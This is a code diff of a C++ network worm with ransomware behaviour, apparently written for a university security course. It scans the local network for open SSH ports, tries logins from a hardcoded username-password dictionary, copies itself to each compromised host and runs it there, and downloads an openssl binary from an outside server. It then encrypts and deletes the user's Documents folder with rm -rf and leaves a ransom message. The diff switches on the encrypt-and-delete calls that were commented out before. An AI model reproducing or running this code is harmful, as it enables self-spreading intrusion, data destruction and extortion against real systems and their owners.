@@ -29,13 +29,10 @@
 #include <net/if.h>
 #include <arpa/inet.h>
   
-  
-  
- std::ofstream myFile;
-  
-  
+/*Creates a Marker File named 'infectionMarker_extW_CPP.txt
+on the tmp folder in the Victim system'*/
 void markInfected() {
-    std::ofstream myfile("/tmp/infectionMarker_extWCpp.txt");
+    std::ofstream myfile("/tmp/infectionMarker_extW_CPP.txt");
   
     if (myfile.is_open())
     {
@@ -48,19 +45,11 @@ void markInfected() {
   
 }
 
-void markInfected2(std::string host) {
-    std::ofstream myfile("/tmp/neenu.txt");
-  
-    if (myfile.is_open())
-    {
-        myfile << "This system is infected\n" << host.c_str() << std::endl;
-        myfile.close();
-	printf("\nCreated Infection marker on the System %d", host.c_str());
-    }
-    else
-        printf("Unable to open file");
-  
-}
+/*Checks if the system is infected - Checks if Marker file is present in the system at tmp folder
+Input: ssh session
+Output:
+'0' - If there is an error or if file does not exist
+*/
   
 int isInfected(ssh_session session) {
     sftp_file file;
@@ -83,7 +72,7 @@ int isInfected(ssh_session session) {
         return 1;
     }
   
-    file = sftp_open(sftp, "/tmp/infectionMarker_extWCpp.txt", access_type, 0);
+    file = sftp_open(sftp, "/tmp/infectionMarker_extW_CPP.txt", access_type, 0);
     if (file == NULL) {
         printf("\nFile does not exist");
         return 0;
@@ -94,6 +83,9 @@ int isInfected(ssh_session session) {
     }
 }
   
+/*Gets IP Address of Current Machine
+Reference: http://stackoverflow.com/questions/2283494/get-ip-address-of-an-interface-on-linux
+*/
 char* getMyIP(){
 
     int fd;
@@ -115,9 +107,12 @@ char* getMyIP(){
     printf("%s\n", inet_ntoa(((struct sockaddr_in *)&ifr.ifr_addr)->sin_addr));
 
 	return inet_ntoa(((struct sockaddr_in *)&ifr.ifr_addr)->sin_addr);
-
 }
 
+/*This function scans Network for IPs in the LAN which have their port 22 open
+Output: Vector of all the host in the Network with Port 22 open
+Reference: https://hackertarget.com/list-all-ips-in-subnet-with-nmap/
+*/
 std::vector<std::string> getHostsOnSameNetwork() {
     FILE *fp;
     char path[1035];
@@ -134,7 +129,6 @@ std::vector<std::string> getHostsOnSameNetwork() {
         while (!feof(fp)) {
             if (fgets(path, sizeof(path), fp) != NULL) {
                 res.push_back(path);
-		myFile << "Inserting: " << path; 
             }
         }
   
@@ -145,6 +139,9 @@ std::vector<std::string> getHostsOnSameNetwork() {
     }
 }
   
+/*Downloads openssl Program for encryption
+Reference: http://stackoverflow.com/a/1636415/5741374
+*/
 size_t write_data(void *ptr, size_t size, size_t nmemb, FILE *stream) {
     size_t written = fwrite(ptr, size, nmemb, stream);
     return written;
@@ -154,12 +151,12 @@ void downloadOpenSSL() {
     CURL *curl;
     FILE *fp;
     CURLcode res;
-    char *url = "http://ecs.fullerton.edu/~mgofman/openssl";
+    std::string url = "http://ecs.fullerton.edu/~mgofman/openssl";
     char outfilename[FILENAME_MAX] = "openssl";
     curl = curl_easy_init();
     if (curl) {
         fp = fopen(outfilename, "wb");
-        curl_easy_setopt(curl, CURLOPT_URL, url);
+        curl_easy_setopt(curl, CURLOPT_URL, url.c_str());
         curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, write_data);
         curl_easy_setopt(curl, CURLOPT_WRITEDATA, fp);
         res = curl_easy_perform(curl);
@@ -171,7 +168,14 @@ void downloadOpenSSL() {
      
 }
   
-  
+/*Copies the executable of this worm  to remote system
+Input: ssh Session
+Output:
+'0'  - If error Occurs
+'1' - Successful Copy
+Reference: http://stackoverflow.com/a/13692035/5741374
+Reference: http://api.libssh.org/master/libssh_tutor_sftp.html
+*/
 int copyFile(ssh_session session) {
     sftp_file file;
     int rc;
@@ -183,16 +187,16 @@ int copyFile(ssh_session session) {
     {
         fprintf(stderr, "\nError allocating SFTP session: %s\n",
             ssh_get_error(session));
-        return SSH_ERROR;
+        return 0;
     }
     rc = sftp_init(sftp);
     if (rc != SSH_OK)
     {
         sftp_free(sftp);
-        return rc;
+        return 0;
     }
   
-    file = sftp_open(sftp, "/tmp/a.out",
+    file = sftp_open(sftp, "/tmp/extorterW",
         access_type, S_IRWXU);
     if (file == NULL)
     {
@@ -201,7 +205,7 @@ int copyFile(ssh_session session) {
         return 0;
     }
   
-    std::ifstream fin("/tmp/a.out", std::ios::binary);
+    std::ifstream fin("/tmp/extorterW", std::ios::binary);
     if (fin) {
         fin.seekg(0, std::ios::end);
         std::ios::pos_type length = fin.tellg(); // get file size in bytes
@@ -226,9 +230,15 @@ int copyFile(ssh_session session) {
     printf("\nCopy Successfull !");
     return 1;
   
-  
 }
   
+/*Executes the worm on Victim System
+Input: ssh Session
+Output:
+'0' - Problem in execution
+'1' - Successful execution of remote command
+Refernce: http://api.libssh.org/master/libssh_tutor_command.html
+*/
 int executeFile(ssh_session session) {
     ssh_channel channel;
     int rc;
@@ -238,9 +248,12 @@ int executeFile(ssh_session session) {
         rc = ssh_channel_open_session(channel);
         if (rc == SSH_OK) {
             if (copyFile(session)) {
-                rc = ssh_channel_request_exec(channel, "/tmp/a.out > output.txt");
+                rc = ssh_channel_request_exec(channel, "/tmp/extorterW");
                 if (rc == SSH_OK) {
-                    printf("\nExecuted command on remote machine");
+					sleep(10);
+					ssh_channel_close(channel);
+					printf("\nExecuted command on remote machine");
+					return 1;
                 }
                 else {
                     printf("\nCannot give run permissions to the file");
@@ -262,21 +275,25 @@ int executeFile(ssh_session session) {
         return 0;
     }
 }
-  
+
+/*Tries to connect to a remote system using ssh protocol
+Tries to login to a system using the predefined Dictionary of usernames and passwords
+Input: ssh Session, IP Address of host, Dictionary of usernames and passwords
+Output:
+'0' - Unsuccessful connection attempt
+'1' - Successful Connection attempt
+*/
 int connectionToHost(ssh_session session, std::string host, std::map<std::string, std::string> &dictAttackList) {
-	 myFile <<"In connection: cstart";
     int rc;
     ssh_options_set(session, SSH_OPTIONS_HOST, host.c_str());
     const char *username, *password;
   
-  
     rc = ssh_connect(session);
-  myFile <<"In connection: connecting";
+ 
     if (rc == SSH_OK) {
   
         if (ssh_write_knownhost(session) < 0) {
             fprintf(stderr, "Error %s", strerror(errno));
-		 myFile <<"In connection: cannot write";
             	return 0;
         }
         else {
@@ -284,17 +301,14 @@ int connectionToHost(ssh_session session, std::string host, std::map<std::string
   
                 username = (it->first).c_str();
                 password = (it->second).c_str();
-  		 myFile <<"In connection: trying username" <<username <<password;
                 rc = ssh_userauth_password(session, NULL, password);
                 if (rc == SSH_AUTH_SUCCESS) {
                     printf("\nLogin Success");
- myFile <<"In connection: Login Success";
                     return 1;
                 }
             }
             if (rc != SSH_AUTH_SUCCESS) {
                 printf("\n Error Authenticating");
-		 myFile <<"In connection: cannot autheticate";
             }
         }
   
@@ -308,7 +322,7 @@ int connectionToHost(ssh_session session, std::string host, std::map<std::string
   
   
   
-  
+/*Initialized Dictionary for Attack*/
 void initializeDict(std::map<std::string, std::string> &dictAttackList) {
     dictAttackList["ubuntu"] = "123456";
     dictAttackList["hello"] = "worlds";
@@ -317,6 +331,10 @@ void initializeDict(std::map<std::string, std::string> &dictAttackList) {
     printf("\nDictionary Initialized !!!");
 }
   
+/*Method implements the follwoing functionalities:
+1. Give executable permissions to downloaded openssl program
+2. Tar the /home/ubuntu/Documents Folder
+3. Encrypt tar using the openssl program*/
 void tarAndEncrypt(){
     try{
             system("chmod a+x ./openssl");
@@ -326,15 +344,17 @@ void tarAndEncrypt(){
             printf("\n Created Encrypted File");
         }
         catch(...){
-            std::cout<<"Exception is occured";
+            std::cout<<"Exception is occured in tar or encryption";
         }
 }
  
+/*Method implements the following functionalities:
+1. Delete the /home/ubuntu/Documents folder
+2. Leave system Compromised message on the /home/ubuntu folder*/
 void deleteDirAndLeaveMessage() {
     system("rm -rf /home/ubuntu/Documents/");
     printf("\n Deleted Documents folder");
-    system("cp DocumentsDir.tar.enc /home/ubuntu/Desktop/");
-    std::ofstream myfile("/home/ubuntu/Desktop/SystemCompromisedCpp.txt");
+    std::ofstream myfile("/home/ubuntu/SystemCompromisedCpp.txt");
  
     if (myfile.is_open())
     {
@@ -345,51 +365,49 @@ void deleteDirAndLeaveMessage() {
         printf("\n Unable to open file for wrtign Threat message");
 }
   
+
 int main() {
   
     ssh_session my_ssh_session;
     ssh_channel channel;
     int res;
-
-myFile.open("/tmp/check.txt");
     std::map<std::string, std::string> dictAttackList;
+	/*Call to initialize Dictionary*/
     initializeDict(dictAttackList);
+
+	/*Call to mark the system as Infected*/
     markInfected();
-myFile << "Cto If" <<std::endl;
+
+	/*Executes the Extortion functionality only is the system is not the Attacker.
+	192.168.1.4 in this scenario is the Attacker*/
 	if(strcmp(getMyIP(), "192.168.1.4") != 0){
-		//downloadOpenSSL();
-                //tarAndEncrypt();
-		//deleteDirAndLeaveMessage();
+		downloadOpenSSL();
+        tarAndEncrypt();
+		deleteDirAndLeaveMessage();
 	}
-myFile << "Came back"<<std::endl;
+
+	/*Call to fetch Hosts in the Network*/
     std::vector<std::string> hosts = getHostsOnSameNetwork();
-	myFile << "Came back after get hosts";
+	
+	/*Iterating through the hosts to connect and infect the system*/
     for (std::vector<std::string>::iterator host = hosts.begin(); host != hosts.end(); ++host) {
         std::cout << "\n Host: " << *host;
-  	myFile << *host <<std::endl;
-        my_ssh_session = ssh_new();
-	
-        if (my_ssh_session == NULL){
-		myFile << "My ssh is NULL" << my_ssh_session <<std::endl;
-		exit(-1);
-	}           
- myFile << "My ssh is not null" << my_ssh_session <<std::endl;
+        
+		my_ssh_session = ssh_new();
+		if (my_ssh_session == NULL)
+			exit(-1);
+
 
         if (connectionToHost(my_ssh_session, *host, dictAttackList) > 0) {
             printf("\nSucceded to get into the host");
-  		myFile << "Logged in to "<<*host <<std::endl;
             if (!isInfected(my_ssh_session)) {
-		myFile << "this is not infected" <<*host<<std::endl;
                 res = executeFile(my_ssh_session);
-		
                 if (res) {
-                    
                     std::cout << "\n Infected. " << *host << ". I can rest now ;)\n";
                     break;
                 }
             }
         }
     }
- myFile.close();
      
 }
